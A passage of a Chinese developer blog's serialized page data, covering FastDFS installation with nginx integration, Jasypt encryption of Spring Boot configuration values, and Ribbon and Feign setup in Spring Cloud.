^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n修改如下文件\n\nvi /usr/libexec/urlgrabber-ext-down\n#把第一行的\n#!/usr/bin/python\n\n#修改为，然后重新安装\n#!/usr/bin/python2\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 磁盘目录\n\n说明                  位置\n所有安装包               /home/dfs/lib\n数据存储位置              /home/dfs/store\n这里我为了方便把日志什么的都放到了   /home/dfs/log\n\n\n# 安装 libfastcommon\n\ngit clone https://github.com/happyfish100/libfastcommon.git --depth 1\ncd libfastcommon/\n./make.sh && ./make.sh install #编译安装\n\n\n1\n2\n3\n\n\n\n# 安装 fastdfs\n\ncd ../ #返回上一级目录\ngit clone https://github.com/happyfish100/fastdfs.git --depth 1\ncd fastdfs/\n./make.sh && ./make.sh install #编译安装\n#配置文件准备\ncp /etc/fdfs/tracker.conf.sample /etc/fdfs/tracker.conf\ncp /etc/fdfs/storage.conf.sample /etc/fdfs/storage.conf\ncp /etc/fdfs/client.conf.sample /etc/fdfs/client.conf #客户端文件，测试用\ncp /home/dfs/lib/fastdfs/conf/http.conf /etc/fdfs/ #供nginx访问使用\ncp /home/dfs/lib/fastdfs/conf/mime.types /etc/fdfs/ #供nginx访问使用\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 安装 fastdfs-nginx-module\n\ncd ../ #返回上一级目录\ngit clone https://github.com/happyfish100/fastdfs-nginx-module.git --depth 1\ncp /home/dfs/lib/fastdfs-nginx-module/src/mod_fastdfs.conf /etc/fdfs\n\n\n1\n2\n3\n\n\n配合 nginx 使用，关于 nginx 安装这里就不说了，安装后 nginx 需要配置如下：\n\n./configure --prefix=/home/nginx-1.18.0 --add-module=/home/dfs/lib/fastdfs-nginx-module/src\n\n\n1\n\n\n\n# 单机部署\n\n\n# tracker 配置\n\n#服务器ip为 10.24x.3x.xx2\n#我建议用ftp下载下来这些文件 本地修改\nvim /etc/fdfs/tracker.conf\n#需要修改的内容如下\nport=22122  # tracker服务器端口（默认22122,一般不修改）\nbase_path=/home/dfs/log  # 存储日志和数据的根目录\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# storage 配置\n\nvim /etc/fdfs/storage.conf\n#需要修改的内容如下\nport=23000  # storage服务端口（默认23000,一般不修改）\nbase_path=/home/dfs/log  # 数据和日志文件存储根目录\nstore_path0=/home/dfs/store  # 第一个存储目录\ntracker_server=10.24x.3x.xx2:22122  # tracker服务器ip和端口\nhttp.server_port=8888  # http访问文件的端口(默认8888,看情况修改,和nginx中保持一致)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 启动\n\n# tracker\n\n/etc/init.d/fdfs_trackerd start #启动tracker服务\n/etc/init.d/fdfs_trackerd restart #重启动tracker服务\n/etc/init.d/fdfs_trackerd stop #停止tracker服务\nchkconfig fdfs_trackerd on #自启动tracker服务\n\n\n1\n2\n3\n4\n\n\n# storage\n\n/etc/init.d/fdfs_storaged start #启动storage服务\n/etc/init.d/fdfs_storaged restart #重动storage服务\n/etc/init.d/fdfs_storaged stop #停止动storage服务\nchkconfig fdfs_storaged on #自启动storage服务\n\n\n1\n2\n3\n4\n\n\n\n# client 测试\n\n返回 groupx 意思就是成功了，文件被重新改名字并且被放在了某个地方\n\nvim /etc/fdfs/client.conf\n#需要修改的内容如下\nbase_path=/home/dfs/log\ntracker_server=10.24x.3x.xx2:22122    #tracker服务器ip和端口\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/m00/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n不知道可以用以下命令来搜找\n\n[root@node102 home]# find / -name cvaezl_r4usafhxsaaacuytz3no8807.sh\n/home/dfs/store/data/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n\n\n\n# nginx 配置访问\n\nvim /etc/fdfs/mod_fastdfs.conf\n#需要修改的内容如下\ntracker_server=10.24x.3x.xx2:22122  #tracker服务器ip和端口\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#配置nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#添加如下配置\nserver {\n    listen       8888;    ## 该端口为storage.conf中的http.server_port相同\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n# 先把8888端口打开\n/sbin/iptables -i input -p tcp --dport 8888 -j accept\n#测试下载，用外部浏览器访问刚才已传过的nginx安装包,引用返回的id\nhttp://10.24x.3x.xx2:8888/group1/m00/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n如果 nginx 启动 unknown directive "ngx_fastdfs_module"，则是安装 nginx --add-module=/home/dfs/lib/fastdfs-nginx-module/src 失败，可以用./nginx -v 查看。\n\n[root@node102 sbin]# ./nginx -v\nnginx version: nginx/1.18.0\nbuilt by gcc 9.3.1 20200408 (red hat 9.3.1-2) (gcc) \nbuilt with openssl 1.0.2k-fips  26 jan 2017\ntls sni support enabled\nconfigure arguments: --add-module=/home/dfs/lib/fastdfs-nginx-module/src --prefix=/home/nginx-1.18.0 --with-http_stub_status_module --with-http_ssl_module --with-http_v2_module --with-pcre=/home/pcre-8.35\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 分布式部署\n\n\n# storage 配置\n\ntracker 配置 和单机部署是一样的不变，只需要改变 storage 配置\n\nvim /etc/fdfs/storage.conf\n#需要修改的内容如下\nport=23000  # storage服务端口（默认23000,一般不修改）\nbase_path=/home/dfs/log  # 数据和日志文件存储根目录\nstore_path0=/home/dfs/store  # 第一个存储目录\ntracker_server=10.240.3x.xx0:22122  # 服务器1\ntracker_server=10.240.3x.xx1:22122  # 服务器2\ntracker_server=10.240.3x.xx2:22122  # 服务器3\nhttp.server_port=8888  # http访问文件的端口(默认8888,看情况修改,和nginx中保持一致)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# client 测试\n\nvim /etc/fdfs/client.conf\n#需要修改的内容如下\nbase_path=/home/moe/dfs\ntracker_server=10.240.3x.xx0:22122  # 服务器1\ntracker_server=10.240.3x.xx1:22122  # 服务器2\ntracker_server=10.240.3x.xx2:22122  # 服务器3\n# 保存退出\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/m00/00/00/cvaezl_r4usafhxsaaacuytz3no8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 配置 nginx 访问\n\nvim /etc/fdfs/mod_fastdfs.conf\n#需要修改的内容如下\ntracker_server=10.240.3x.xx0:22122  # 服务器1\ntracker_server=10.240.3x.xx1:22122  # 服务器2\ntracker_server=10.240.3x.xx2:22122  # 服务器3\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#配置nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#添加如下配置\nserver {\n    listen       8888;    ## 该端口为storage.conf中的http.server_port相同\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 集成 springboot\n\n\n# 引入依赖\n\n<dependency>\n    <groupid>com.github.tobato</groupid>\n    <artifactid>fastdfs-client</artifactid>\n    <version>1.26.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# 添加配置\n\nfdfs:\n  # 连接的超时时间\n  connect-timeout: 3000\n  # 读取的超时时间\n  so-timeout: 3000\n  #tracker服务所在的ip地址和端口号\n  tracker-list: 10.240.3x.xx2:22122\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# controller\n\n@restcontroller\n@requestmapping("/img")\npublic class imgcontroller {\n\n    @autowired\n    private imgserver imgserver;\n\n    @postmapping("/push")\n    public responsedata push(@requestparam("file") multipartfile file){\n        return imgserver.push(file);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 实现\n\n@service\n@slf4j\npublic class imgserverimpl implements imgserver {\n    @autowired\n    fastfilestorageclient fastfilestorageclient;\n\n    @override\n    public responsedata<string> push(multipartfile file) {\n        if (file.isempty()) {\n            return responsedata.failureresponse(uploadfilecode.upload_file_code_1000);\n        }\n        try {\n            log.info("开始上传 {}", file.getoriginalfilename());\n            string filesuffix = file.getoriginalfilename().substring(file.getoriginalfilename().lastindexof(".")+1);\n            storepath storepath = fastfilestorageclient.uploadfile(file.getinputstream(), file.getsize(),filesuffix, null);\n            string path = storepath.getfullpath();\n            log.info("上传成功");\n            return responsedata.successresponse(path);\n        } catch (ioexception e) {\n            log.error(e.tostring(), e);\n            return responsedata.failureresponse(uploadfilecode.upload_file_code_1001.getcode(), e.tostring());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n',charsets:{cjk:!0}},{title:"Spring Boot 集成 Jasypt 3.0.3 配置文件加密",frontmatter:{title:"Spring Boot 集成 Jasypt 3.0.3 配置文件加密",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/205/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/205.Spring%20Boot%20%E9%9B%86%E6%88%90%20Jasypt%203.0.3%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8A%A0%E5%AF%86.html",relativePath:"01.框架/01.Spring/03.spring boot/205.Spring Boot 集成 Jasypt 3.0.3 配置文件加密.md",key:"v-2c7a2efa",path:"/spring/spring-boot/205/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'依赖\n\n<dependency>\n    <groupId>com.github.ulisesbocchio</groupId>\n    <artifactId>jasypt-spring-boot-starter</artifactId>\n    <version>3.0.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nyml 中添加配置文件\n\njasypt:\n  encryptor:\n    # 盐加密\n    password: aabbcc\n    # 指定加密方式\n    algorithm: PBEWithMD5AndDES\n    iv-generator-classname: org.jasypt.iv.NoIvGenerator\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n输出加密密码工具类\n\npackage com.aa.cloud.util;\n\nimport org.jasypt.encryption.pbe.PooledPBEStringEncryptor;\nimport org.jasypt.encryption.pbe.config.SimpleStringPBEConfig;\n\n/**\n * @author big uncle\n * @date 2020/11/23 14:23\n * @module\n **/\npublic class JasyptUtil {\n\n\n    /**\n     * Jasypt生成加密结果\n     * @param password 配置文件中设定的加密盐值\n     * @param value 加密值\n     * @return\n     */\n    public static String encyptPwd(String password,String value){\n        PooledPBEStringEncryptor encryptor = new PooledPBEStringEncryptor();\n        encryptor.setConfig(cryptor(password));\n        String result = encryptor.encrypt(value);\n        return result;\n    }\n\n    /**\n     * 解密\n     * @param password 配置文件中设定的加密盐值\n     * @param value 解密密文\n     * @return\n     */\n    public static String decyptPwd(String password,String value){\n        PooledPBEStringEncryptor encryptor = new PooledPBEStringEncryptor();\n        encryptor.setConfig(cryptor(password));\n        String result = encryptor.decrypt(value);\n        return result;\n    }\n\n    public static SimpleStringPBEConfig cryptor(String password){\n        SimpleStringPBEConfig config = new SimpleStringPBEConfig();\n        config.setPassword(password);\n        config.setAlgorithm("PBEWithMD5AndDES");\n        config.setKeyObtentionIterations("1000");\n        config.setPoolSize("1");\n        config.setProviderName("SunJCE");\n        config.setSaltGeneratorClassName("org.jasypt.salt.RandomSaltGenerator");\n        config.setStringOutputType("base64");\n        return config;\n    }\n\n\n    public static void main(String[] args) {\n        // 加密\n        String encPwd = encyptPwd("giant", "mysql");\n        // 解密\n        String decPwd = decyptPwd("giant", encPwd);\n        System.out.println(encPwd);\n        System.out.println(decPwd);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\n得到加密密码进行替换\n\n  redis:\n    host: 192.168.81.101\n    password: ENC(u1itOZa4Xt3qMyG1VJGa9fc0wDUaQ59/)\n    database: 0\n    port: 26379\n    timeout: 10000\n    sentinel:\n      nodes:\n        - 192.168.81.101:26379\n        - 192.168.81.102:26379\n      password: ENC(1iyE4/wqjqSHmFKKVVpLAg==)\n      master: mymaster\n      enable: true\n    lettuce:\n      pool:\n        max-wait: 10000\n        max-active: 30\n        max-idle: 15\n        min-idle: 15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n建议部署的时候 盐 不要放到配置文件，可以用启动参数 -Djasypt.encryptor.password=aabbcc 来替代。',normalizedContent:'依赖\n\n<dependency>\n    <groupid>com.github.ulisesbocchio</groupid>\n    <artifactid>jasypt-spring-boot-starter</artifactid>\n    <version>3.0.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nyml 中添加配置文件\n\njasypt:\n  encryptor:\n    # 盐加密\n    password: aabbcc\n    # 指定加密方式\n    algorithm: pbewithmd5anddes\n    iv-generator-classname: org.jasypt.iv.noivgenerator\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n输出加密密码工具类\n\npackage com.aa.cloud.util;\n\nimport org.jasypt.encryption.pbe.pooledpbestringencryptor;\nimport org.jasypt.encryption.pbe.config.simplestringpbeconfig;\n\n/**\n * @author big uncle\n * @date 2020/11/23 14:23\n * @module\n **/\npublic class jasyptutil {\n\n\n    /**\n     * jasypt生成加密结果\n     * @param password 配置文件中设定的加密盐值\n     * @param value 加密值\n     * @return\n     */\n    public static string encyptpwd(string password,string value){\n        pooledpbestringencryptor encryptor = new pooledpbestringencryptor();\n        encryptor.setconfig(cryptor(password));\n        string result = encryptor.encrypt(value);\n        return result;\n    }\n\n    /**\n     * 解密\n     * @param password 配置文件中设定的加密盐值\n     * @param value 解密密文\n     * @return\n     */\n    public static string decyptpwd(string password,string value){\n        pooledpbestringencryptor encryptor = new pooledpbestringencryptor();\n        encryptor.setconfig(cryptor(password));\n        string result = encryptor.decrypt(value);\n        return result;\n    }\n\n    public static simplestringpbeconfig cryptor(string password){\n        simplestringpbeconfig config = new simplestringpbeconfig();\n        config.setpassword(password);\n        config.setalgorithm("pbewithmd5anddes");\n        config.setkeyobtentioniterations("1000");\n        config.setpoolsize("1");\n        config.setprovidername("sunjce");\n        config.setsaltgeneratorclassname("org.jasypt.salt.randomsaltgenerator");\n        config.setstringoutputtype("base64");\n        return config;\n    }\n\n\n    public static void main(string[] args) {\n        // 加密\n        string encpwd = encyptpwd("giant", "mysql");\n        // 解密\n        string decpwd = decyptpwd("giant", encpwd);\n        system.out.println(encpwd);\n        system.out.println(decpwd);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\n得到加密密码进行替换\n\n  redis:\n    host: 192.168.81.101\n    password: enc(u1itoza4xt3qmyg1vjga9fc0wduaq59/)\n    database: 0\n    port: 26379\n    timeout: 10000\n    sentinel:\n      nodes:\n        - 192.168.81.101:26379\n        - 192.168.81.102:26379\n      password: enc(1iye4/wqjqshmfkkvvplag==)\n      master: mymaster\n      enable: true\n    lettuce:\n      pool:\n        max-wait: 10000\n        max-active: 30\n        max-idle: 15\n        min-idle: 15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n建议部署的时候 盐 不要放到配置文件，可以用启动参数 -djasypt.encryptor.password=aabbcc 来替代。',charsets:{cjk:!0}},{title:"Spring Boot VUE前后端加解密",frontmatter:{title:"Spring Boot VUE前后端加解密",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/207/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/207.Spring%20Boot%20VUE%E5%89%8D%E5%90%8E%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86.html",relativePath:"01.框架/01.Spring/03.spring boot/207.Spring Boot VUE前后端加解密.md",key:"v-6b4bcf80",path:"/spring/spring-boot/207/",headers:[{level:2,title:"Malformed UTF-8 data",slug:"malformed-utf-8-data",normalizedTitle:"malformed utf-8 data",charIndex:2},{level:2,title:"ecurityException: JCE cannot authenticate the provider BC",slug:"ecurityexception-jce-cannot-authenticate-the-provider-bc",normalizedTitle:"ecurityexception: jce cannot authenticate the provider bc",charIndex:309}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Malformed UTF-8 data ecurityException: JCE cannot authenticate the provider BC",content:'# Malformed UTF-8 data\n\n整个问题还是比较奇怪的，在 idea 运行的时候没有问题，把前端打包的文件放到后端整合并打成 jar 包后就出现了，找到一篇文档说是启动 jar 的时候加入 -Dfile.encoding=UTF-8 即可\n\njava "-Dfile.encoding=UTF-8" -jar tool-boot-0.0.1-SNAPSHOT.jar\n\n\n1\n\n\n但如果你是 tomcat，需要在 catalina.bat 中设置\n\nset "JAVA_OPTS=%JAVA_OPTS% %LOGGING_CONFIG% -Dfile.encoding=UTF-8"\n\n\n1\n\n\n\n# ecurityException: JCE cannot authenticate the provider BC\n\n出现这里错误是由于 jdk 验签问题，oracle 的 jdk 大部分人再用，但是现在更推荐 openjdk，换成 openjdk 就不会再出现这类问题',normalizedContent:'# malformed utf-8 data\n\n整个问题还是比较奇怪的，在 idea 运行的时候没有问题，把前端打包的文件放到后端整合并打成 jar 包后就出现了，找到一篇文档说是启动 jar 的时候加入 -dfile.encoding=utf-8 即可\n\njava "-dfile.encoding=utf-8" -jar tool-boot-0.0.1-snapshot.jar\n\n\n1\n\n\n但如果你是 tomcat，需要在 catalina.bat 中设置\n\nset "java_opts=%java_opts% %logging_config% -dfile.encoding=utf-8"\n\n\n1\n\n\n\n# ecurityexception: jce cannot authenticate the provider bc\n\n出现这里错误是由于 jdk 验签问题，oracle 的 jdk 大部分人再用，但是现在更推荐 openjdk，换成 openjdk 就不会再出现这类问题',charsets:{cjk:!0}},{title:"SpringCloud 之 Ribbon和Feign",frontmatter:{title:"SpringCloud 之 Ribbon和Feign",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-cloud/1/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/04.spring%20cloud/1.SpringCloud%20%E4%B9%8B%20Ribbon%E5%92%8CFeign.html",relativePath:"01.框架/01.Spring/04.spring cloud/1.SpringCloud 之 Ribbon和Feign.md",key:"v-1acf6d1d",path:"/spring/spring-cloud/1/",headers:[{level:2,title:"Ribbon",slug:"ribbon",normalizedTitle:"ribbon",charIndex:2},{level:3,title:"一、对比",slug:"一、对比",normalizedTitle:"一、对比",charIndex:13},{level:3,title:"二、开发",slug:"二、开发",normalizedTitle:"二、开发",charIndex:281},{level:2,title:"Feign",slug:"feign",normalizedTitle:"feign",charIndex:2071},{level:3,title:"fegin简介",slug:"fegin简介",normalizedTitle:"fegin 简介",charIndex:2081},{level:3,title:"使用",slug:"使用",normalizedTitle:"使用",charIndex:877},{level:3,title:"Feign对压缩的支持",slug:"feign对压缩的支持",normalizedTitle:"feign 对压缩的支持",charIndex:3638},{level:3,title:"feign对OkHttp的支持",slug:"feign对okhttp的支持",normalizedTitle:"feign 对 okhttp 的支持",charIndex:4038},{level:3,title:"五、日志",slug:"五、日志",normalizedTitle:"五、日志",charIndex:6272},{level:3,title:"Feign的全局异常处理",slug:"feign的全局异常处理",normalizedTitle:"feign 的全局异常处理",charIndex:16721}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Ribbon 一、对比 二、开发 Feign fegin简介 使用 Feign对压缩的支持 feign对OkHttp的支持 五、日志 Feign的全局异常处理",content:'# Ribbon\n\n\n# 一、对比\n\nRPC\n\n * 远程过程调用，像调用本地方法一样调用服务器的服务\n * 支持同步或异步\n * 客户端和服务器之间建立 TCP 连接，可以一次建立一个，也可以多个调用复用一次连接\n * RPC 数据包小 (谷歌 protobuf 以二进制方式传输)\n * 比较复杂要进行：编码，解码，序列化，连接，丢包，拆包，组合，协议制定\n   Rest (HTTP)\n * HTTP 请求，支持多种协议和功能\n * 开发方便成本低\n * http 数据包大\n * java 开发：HttpClient URLConnection\n\n\n# 二、开发\n\n引入依赖\n\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-netflix-ribbon</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n\n\n在 application 种配置\n\n    @Bean\n    @LoadBalanced\n    public RestTemplate restTemplate(){\n        return new RestTemplate();\n    }\n\n\n1\n2\n3\n4\n5\n\n\n修负载均衡改策略\n\n    /**\n     * 功能描述: 负载均衡策略\n     * RoundRobinRule:轮询\n     * RandomRule:随机\n     * AvailabilityFilteringRule: 会先过滤掉由于多次访问故障而处于断路器跳闸状态的服务,以及并发的连接数量\n     * 超过阈值的服务,然后对剩余的服务列表按照轮询策略进行访问;\n     * WeightedResponseTimeRule: 根据平均响应时间计算所有服务的权重,响应时间越快,服务权重越大,被选中的机率越高;\n     * 刚启动时,如果统计信息不足,则使用RoundRobinRule策略,等统计信息足够时,会切换到WeightedResponseTimeRule\n     * RetryRule: 先按照RoundRobinRule的策略获取服务,如果获取服务失败,则在指定时间内会进行重试,获取可用的服务;\n     * BestAvailableRule: 会先过滤掉由于多次访问故障而处于断路器跳闸状态的服务,然后选择一个并发量最小的服务;\n     * ZoneAvoidanceRule: 默认规则,复合判断server所在区域的性能和server的可用性选择服务器;\n     * @return : com.netflix.loadbalancer.IRule\n     * @author : big uncle\n     * @date : 2019/9/7 14:07\n     */\n    @Bean\n    public IRule myRule(){\n        //自定义均衡策略\n        return new RandomRule();\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n实际调用\n\n/**\n* 订单消费服务\n* @author shengwu ni\n*/\n@RestController\n@RequestMapping("/consumer/order")\npublic class OrderConsumerController {\n\n   /**\n    * 订单服务提供者模块的 url 前缀\n    */\n//    private static final String ORDER_PROVIDER_URL_PREFIX = "http://localhost:8001";\n   private static final String ORDER_PROVIDER_URL_PREFIX = "http://MICROSERVICE-ORDER";\n\n   @Resource\n   private RestTemplate restTemplate;\n\n   @GetMapping("/get/{id}")\n   public TOrder getOrder(@PathVariable Long id) {\n\n       return restTemplate.getForObject(ORDER_PROVIDER_URL_PREFIX + "/provider/order/get/" + id, TOrder.class);\n   }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# Feign\n\n\n# fegin 简介\n\nfegin 是 Netflix 开发的声明式、模板化的 HTTP 客户端，其令该来自 Retrofit、JAXRS-2.0 以及 WebSocket。feign 可帮助我们更加便捷，优雅的调用 HTTP API。\n在 spring cloud 中，使用 feign 非常简单，创建一个接口，并在接口上添加一些注解，代码就完成了。feign 支持多种注解，例如 feign 自带的注解或者 JAX-RS 注解等 。\nspring cloud 对 feign 进行了增强，使 feign 支持了 Spring MVC 注解，并整合了 Ribbon 和 Eureka\n, 从而让 Feign 的使用更加便捷。\n\n\n# 使用\n\n添加依赖\n\n\x3c!-- 包含了Ribbon 和 hystrix --\x3e\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-openfeign</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n编写 接口，path 是请求控制器的路径，name 是访问服务的 application.name\n\n// name=eureka里注册的服务\n@FeignClient(path = "test", name = "client-hyq-life-server")\npublic interface TestApi {\n\n\n    @RequestMapping(value = "/idnex", method = RequestMethod.GET)\n    String idnex();\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n编写实现\n\n@RestController\n@RequestMapping("test")\npublic class TestController implements TestApi {\n\n    @Autowired\n    private TestServer testServer;\n\n    @Override\n    public String idnex(){\n        return testServer.idnex();\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n编写调用\n\n@RestController\n@RequestMapping("/test")\npublic class TestController {\n\n    @Autowired\n    private TestApi testApi;\n\n    @GetMapping("/index")\n    public String index(){\n        return testApi.idnex();\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n如果两个服务是分离的都需要给启动类加\n\n@EnableFeignClients\n@SpringBootApplication\npublic class BffAppServerApplication {\n\n    public static void main(String[] args) {\n        SpringApplication.run(BffAppServerApplication.class, args);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# Feign 对压缩的支持\n\nfeign:\n  # 不使用 openfeign 自带的熔断\n  hystrix:\n    enabled: false\n  compression:\n    #配置请求 GZIP 压缩\n    request:\n      enabled: true\n      #配置压缩支持的 MIME TYPE\n      mime-types: text/xml,application/xml,application/json\n      #配置压缩数据大小的最小阀值,只有超过了这个大小的请求才会对其进行压缩。,默认 2048\n      min-request-size: 300\n    #配置响应 GZIP 压缩\n    response:\n      enabled: true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# feign 对 OkHttp 的支持\n\n依赖\n\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-openfeign</artifactId>\n</dependency>\n<dependency>\n    <groupId>io.github.openfeign</groupId>\n    <artifactId>feign-okhttp</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n拦截日志，这里建议做的有意义一些。\n\n/**\n * @author big uncle\n * @date 2020/6/17 9:02\n * ok http 拦截日志\n **/\n@Slf4j\npublic class OkHttpLogInterceptor implements Interceptor {\n\n    @Override\n    public Response intercept(Chain chain) throws IOException {\n        log.debug("OkHttpUrl : " + chain.request().url());\n        return chain.proceed(chain.request());\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n配置\n\n/**\n * @author big uncle\n * @date 2020/6/17 8:58\n **/\n@Configuration\n@ConditionalOnClass(Feign.class)\n@AutoConfigureBefore(FeignAutoConfiguration.class)\npublic class FeignOkHttpConfig {\n\n    @Bean\n    public okhttp3.OkHttpClient okHttpClient(){\n        return new okhttp3.OkHttpClient.Builder()\n                // 读取超时设置\n                .readTimeout(60, TimeUnit.SECONDS)\n                // 连接超时设置\n                .connectTimeout(60, TimeUnit.SECONDS)\n                //\n                .writeTimeout(120, TimeUnit.SECONDS)\n                .connectionPool(new ConnectionPool())\n                .addInterceptor(okHttpLogInterceptor())\n                // .addInterceptor();\n                .build();\n    }\n\n    @Bean\n    public OkHttpLogInterceptor okHttpLogInterceptor(){\n        return new OkHttpLogInterceptor();\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n配置出现问题，发现配置的超时时间一直不生效，我读取时间设置 30 秒，在拦截里面看只有 1 秒，所以很多时候提示超时。\n最后有个大神跟我说了，fegin 一直都是用的是 default 配置，让我在 yml 配置 connectTimeout，readTimeout\n\nfeign:\n  compression:\n    # 请求压缩\n    request:\n      enabled: true\n      mime-types: "text/xml,application/xml,application/json"\n      # 用于设置请求的最小阈值\n      min-request-size: 1024\n    # 响应压缩\n    response:\n      enabled: true\n  hystrix:\n    enabled: false\n  okhttp:\n    enabled: true\n  client:\n    config:\n      default:\n        connectTimeout: 30000\n        readTimeout: 40000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n经过发现的确可以做到，在代码里的配置优先级居然没有配置文件高，我个人觉得是有问题的，忽然又想到那配置的池是否也是无用的，待观察。\n\n\n# 五、日志\n\n这里为了看每个请求的路径，参数，耗时我们可以进行如下操作，loggerLevel：\n\nfeign:\n  compression:\n    # 请求压缩\n    request:\n      enabled: 